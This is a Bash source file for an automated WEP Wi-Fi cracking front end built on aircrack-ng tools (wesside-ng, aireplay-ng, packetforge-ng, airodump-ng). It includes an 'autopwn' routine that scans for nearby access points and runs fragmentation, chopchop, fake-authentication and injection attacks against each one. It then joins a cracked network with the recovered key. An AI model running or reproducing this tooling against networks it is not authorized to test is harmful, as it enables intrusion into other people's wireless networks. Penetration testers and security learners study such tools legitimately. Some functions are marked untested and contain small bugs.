    execute "Wesside-ng" $WESSIDE -v $Host_MAC -i $wifi & choosewesside
}

wessidetargetmaxer(){
    rm -rf prga.log wep.cap key.log
    execute "Wesside-ng" $WESSIDE -v $Host_MAC -k 1 -i $wifi & choosewesside
}

wessidetargetpoor(){
    rm -rf prga.log wep.cap key.log
    execute "Wesside-ng" $WESSIDE -v $Host_MAC -k 3 -i $wifi & choosewesside
}

wessidenewtarget(){
    rm -rf prga.log wep.cap  key.log
    ap_array=`cat $DUMP_PATH/dump-01.csv | grep -a -n Station | awk -F : '{print $1}'`
    head -n $ap_array $DUMP_PATH/dump-01.csv &> $DUMP_PATH/dump-02.csv && $clear && i=0
    echo -e "`gettext\"        Detected Access point list\"`"
    echo -e "\n #      MAC                      CHAN    SECU    POWER   #CHAR   SSID\n"
    while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
        longueur=${#MAC}
        if [ $longueur -ge 17 ]; then
            i=$(($i+1))
            echo -e " "$i")\t"$MAC"\t"$CHANNEL"\t"$PRIVACY"\t"$POWER"\t"$IDLENGTH"\t"$ESSID
            aidlenght=$IDLENGTH
            assid[$i]=$ESSID
            achannel[$i]=$CHANNEL
            amac[$i]=$MAC
            aprivacy[$i]=$PRIVACY
            aspeed[$i]=$SPEED
        fi

    done < $DUMP_PATH/dump-02.csv
    echo -e "`gettext \"       Select target               \"`"
    read choice
    idlenght=${aidlenght[$choice]}
    ssid=${assid[$choice]}
    channel=${achannel[$choice]}
    mac=${amac[$choice]}
    privacy=${aprivacy[$choice]}
    speed=${aspeed[$choice]}
    Host_IDL=$idlength
    Host_SPEED=$speed
    Host_ENC=$privacy
    Host_MAC=$mac
    Host_CHAN=$channel
    acouper=${#ssid}
    fin=$(($acouper-idlength))
    Host_SSID=${ssid:1:fin}
    execute "Wesside" $WESSIDE -v $Host_MAC -i $wifi & choosewesside
}



# 8.
airmoncheck(){
    if [ "$TYPE" = "Atherosmadwifi-ng" ]; then $AIRMON check wifi0
    else $AIRMON check $wificard; fi
}

mergethisivs(){ # TODO Untested
    for i in $DUMP_PATH/$Host_MAC*.cap; do 
        cur=$( $cur + `$IVSTOOLS --convert $i /dev/null|grep IVs|awk '{print $2}'`)
    done
    return $cur
}

mergeallivs(){ # TODO Untested
    newdir=`mktemp -d`
    for i in $TMPDIR/*/*.cap; do b=$(( $b + 1 )); $IVSTOOLS --convert $i $newdir/$b; done
    ivstools --merge $newdir/* $DUMP_PATH/merged.cap
    read -p "`gettext 'Select merged data as target? (y/N): '`" ACP && [[ "$ACP" = "y" ]] && Host_MAC="merged"
}

changedumppath(){
    OLD_DUMP_PATH=$DUMP_PATH
    read -p "`gettext 'Enter new path: '`" DUMP_PATH
    read -p "`gettext 'Copy data into new folder? (y/N): '`" ACP && [[ "$ACP" = "y" ]] && cp -r $OLD_DUMP_PATH/* $DUMP_PATH/
    read -p "`gettext 'Erase old folder? (y/N): '`" EPF && [[ "$EPF" = "y" ]] && rm -r $OLD_DUMP_PATH
    mkdir -p $DUMP_PATH # If exists, it won't be created again, so we don't lose anything fot this :-)
    clear
}

# This is for iNJECTION  (8)  option
injectmenu(){
    $clear
    while true; do
        ls -lah $DUMP_PATH/fragment-*.xor &>/dev/null
        [[ $? != 0 ]] && {  _ "Can't open fragmentation xor files. Returning"; echo;  return; }
        if [ "$1" == "frag" ]; then
            if [ "$AUTO" == 1 ]; then
                if [ "$Client_MAC" != "" ]; then fragend $Client_MAC; return; fi
                if [ "$FAKE_MAC" != "" ]; then fragend $FAKE_MAC; return; fi
                return
            fi

            mkmenu "Frag Injection" "Frag with client injection"   "Return to main menu"
            read yn; case $yn in
                1 ) fragend $Client_MAC ; break ;;
                2 ) fragend $FAKE_MAC; break ;;
                * ) $clear; break;;
            esac
        fi
        if [ "$1" == "chopchop" ]; then
            if [ "$AUTO" == 1 ]; then
                if [ "$Client_MAC" != "" ]; then chopchopend $Client_MAC; return; fi
                if [ "$FAKE_MAC" != "" ]; then chopchopend $FAKE_MAC; return; fi
                return
            fi

            mkmenu "Chopchop injection" "Chopchop with client inj."  "Return to main menu"
            read yn; case $yn in
                1 ) chopchopend $FAKE_MAC ; break ;;
                2 ) chopchopend $CLIENT_MAC ; break ;;
               * ) $clear; break;;
            esac
        fi
    done
}

fragend(){
    if [ "$Host_MAC" = "" ]; then
        $clear && _ 'ERROR: You must select a target first'
    else
        $ARPFORGE -0 -a $Host_MAC -h $FAKE_MAC -k $Client_IP -l $Host_IP -y $DUMP_PATH/fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
        execute "Fragmentation without client" $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -h $1 -x $INJECTRATE $iwifi 
    fi
}

chopchopend(){
    if [ "$Host_MAC" = "" ]; then
        $clear && _ 'ERROR: You must select a target first'
    else
        $ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y $DUMP_PATH/fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
        rm -rf $DUMP_PATH/chopchop_$Host_MAC*
        $ARPFORGE -0 -a $Host_MAC -h $1 -k $Client_IP -l $Host_IP -w $DUMP_PATH/chopchop_$Host_MAC.cap -y *.xor	
        execute "ChopChop End" $AIREPLAY --interactive -r $DUMP_PATH/chopchop_$Host_MAC.cap -h $1 -x $INJECTRATE $iwifi 
    fi
}

capture(){
    hardclean
    execute "Capturing" $AIRODUMP --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $wifi
}

fakeauth(){
    execute "Fake auth on $Host_SSID" $AIREPLAY --fakeauth $AUTHDELAY -q $KEEPALIVE -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $iwifi
}

Host_ssidinput(){

    echo -e "`gettext \"       Please enter SSID         \"`"
    echo "---------------------------------------"
    read Host_SSID
    $clear
}

configure(){
    if [ -O $DUMP_PATH/$Host_MAC.key ] && [ "$Host_MAC" != "" ]; then
        KEY=`cat $DUMP_PATH/$Host_MAC.key`
        $iwconfig $wificard essid $Host_SSID channel $Host_CHAN key $KEY &>/dev/null
        $DHCPSOFT $wificard &>/dev/null || _ "Could not autoconfigure network" && return 2
        sleep 3; $clear;
    else
        echo "You haven't cracked this network yet"; sleep 3; $clear
    fi
}

doauto(){
    F=0; export AUTO=1; export QUIET=1; export INTERACTIVE=0
        choosetype "WEP" && choosescan && sleep $time_to_scan && killall -2 "airodump-ng" && sleep 2
        echo " done"; sleep 1
		if [ -e $DUMP_PATH/dump-01.csv ]; then
        head -n $ap_array $DUMP_PATH/dump-01.csv &> $DUMP_PATH/dump-02.csv && $clear && i=0
	    while IFS=, read MAC; do i=$(($i+1)) ; done < $DUMP_PATH/dump-02.csv
            sleep 1
        MAX_TARGETS=$i
            echo "Networks detected $MAX_TARGETS"; sleep 1
            for i in `seq 1 $MAX_TARGETS`; do
                echo "Trying to crack target: $i"
    			AUTO=1; Parseforap;  sleep 1
                if [ "$Host_SSID" != "" ]; then
                    autopwn
                else
                    echo "Couldn't find essid, next try"
                fi
            done
        else $clear; _ "ERROR: Could not autodetect access points"; fi
    cleanautovars
}

autopwn(){ 
    F=0; export AUTO=1; export QUIET=1; export INTERACTIVE=0; next=0;
    sleep 1
    oldclear=$clear;clear="";
    for i in $attack_functions; do
        echo "Gonna use $i in $Host_MAC"
        sleep 3
        $i & cleanp &
        while [ "1" ]; do 
            [[ "$next" == 1 ]] && break;
            sleep $autopwn_min_sleep && check_if_worked
            if [ "$?" == 1 ]; then
                auto && cleanautovars && return; 
            else
                next=1;
            fi
        done
    done
    cleanautovars
    clear=$oldclear;
}

cleanautovars(){
    export AUTO=0; export QUIET=""; export INTERACTIVE=1 
}

cleanp(){
    sleep $autopwn_sleep && clean_processes
    export next=1; 
}

check_all_ivs(){
    for i in $DUMP_PATH/$Host_MAC*.cap; do
        cur=`ivstools --convert $i|awk '/IVs/ {print $2}'`
        if [ "$cur" = "" ]; then cur=0; fi
        maxn=$(( $maxn + $cur ))
    done
    if [ "$maxn" == "" ]; then echo 0; fi
    echo $maxn
}

check_if_worked(){
    if [ -x "$AIROSCWORDLIST" ]; then min_ivs=`$AIROSCWORDLIST -m $Host_MAC $Host_SSID`
    else min_ivs=50000; fi
    echo "Minium ivs required: $min_ivs"
    if [ "$min_ivs" == "" ]; then min_ivs=4; fi
    if [ "`check_all_ivs`" -gt $min_ivs ]; then return 1; fi
    return 0
}

checkforcemac() {
    if [ "$force_mac_address" == "1" ]; then $clear && echo "Warn: Not checking mac" 
    else
    	export mac=`$MACCHANGER -s $wificard|awk {'print $3'}`
	    if [ "$FAKE_MAC" != "$mac" ]; then wichchangemac; fi
    fi
}

guess_idata(){
	AIROUTPUT=$($AIRMON $1 $wificard|grep -v "running"|grep -A 1 $wificard);
	export TYPE=`echo \"$AIROUTPUT\" | grep monitor      | awk '{print $2 $3}'`
	export DRIVER=`echo \"$AIROUTPUT\" | grep monitor      | awk '{print $4}'`
	export tmpwifi=`echo \"$AIROUTPUT\" | awk {'print $NF'} | cut -d ")" -f1`
    if [[ "$tmpwifi" =~ (.*)[0-9] ]];  then wifi=$tmpwifi; fi

}

setupairservng(){
	read -p "Do you want to use airserv-ng? [y/N] " var
	if [ "$var" == "y" ]; then
		export wificard=$wifi && read -p "Start a local server? [y/N] " var
		if [ "$var" == "y" ]; then export wifi="127.0.0.1:666" && $AIRSERV -d  $wificard >/dev/null 2>1 &
		else read -p "Enter airserv-ng address [127.0.0.1:666]" wifi
			if [ "$wifi" == "" ]; then export wifi="127.0.0.1:666";fi
		fi
	fi
}
askinterface(){
    mkmenu "Interface selection__" $INTERFACES
    read -p "Select interface: " j
	export wificard=`echo $INTERFACES|awk {"print \\\$$j"}`
}

setinterface(){
    if [ "$1" == "" ]; then
        INTERFACES=`ip link|egrep "^[0-9]+"|awk '/: /{gsub(":"," "); print $2}' |grep -v lo`; 
    fi

    askinterface && checkforcemac

	_ 'Should I put it in monitor mode?' " (Y/n) "; read answer;
    [[ "$anwser" != n ]] && ac="start" || ac="stop"
    guess_idata $ac; clear; testmac

    export iwifi=$wifi

	_ "Interface used is :" $wifi "\n"
	_ 'Interface type is :' "$TYPE ($DRIVER)" "\n"
    sleep 3
}


testmac(){
	if [ "$TYPE" = "Atherosmadwifi-ng" ]; then
		FAKE_MAC=`ifconfig $wificard | grep $wifi | awk '{print $5}' | cut -c -17  | sed -e "s/-/:/" | sed -e "s/\-/:/"  | sed -e "s/\-/:/" | sed -e "s/\-/:/" | sed -e "s/\-/:/"`
		_ "Changed fake_mac :" " $FAKE_MAC"
	fi
}

blankssid(){
	while true; do
		$clear
        mkmenu "Blank SSID, enter manually?" "Yes" "No" 
		read yn; case $yn in
			1 ) Host_ssidinput ; break ;;
			2 ) Host_SSID="" ; break ;;
			* ) echo "unknown response. Try again" ;;
		esac
	done
}

target(){
	echo -e "`gettext \"
_______Target information______

   AP SSID       = $Host_SSID
   AP MAC        = $Host_MAC
   AP Channel    =$Host_CHAN
   Client MAC    = $Client_MAC
   Fake MAC      = $FAKE_MAC
   AP Encryption =$Host_ENC
   AP Speed      =$Host_SPEED
________________________________\"`"
read -p "Press any key to continue " foo
}


